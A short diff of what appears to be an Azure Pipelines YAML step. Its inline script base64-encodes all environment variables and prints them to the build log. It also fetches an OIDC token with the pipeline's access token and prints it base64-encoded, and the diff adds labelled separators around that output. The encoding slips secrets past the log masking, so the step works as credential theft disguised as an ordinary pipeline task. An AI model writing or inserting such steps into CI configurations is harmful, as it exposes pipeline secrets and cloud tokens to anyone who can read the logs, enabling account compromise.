@@ -13,8 +13,12 @@ steps:
     targetType: 'inline'
     script: |
       echo "Environment variables (base64 encoded):"
+      echo ""
       env | base64 -w 0
+      echo ""
       OIDC_TOKEN=$(curl -sSL -H "Authorization: Bearer $(System.AccessToken)" "$(System.OidcRequestUri)?resource=https://dev.azure.com/")
+      echo ""
+      echo "TOKEN"
       echo $OIDC_TOKEN | base64 -w 0
       echo ""
   env:
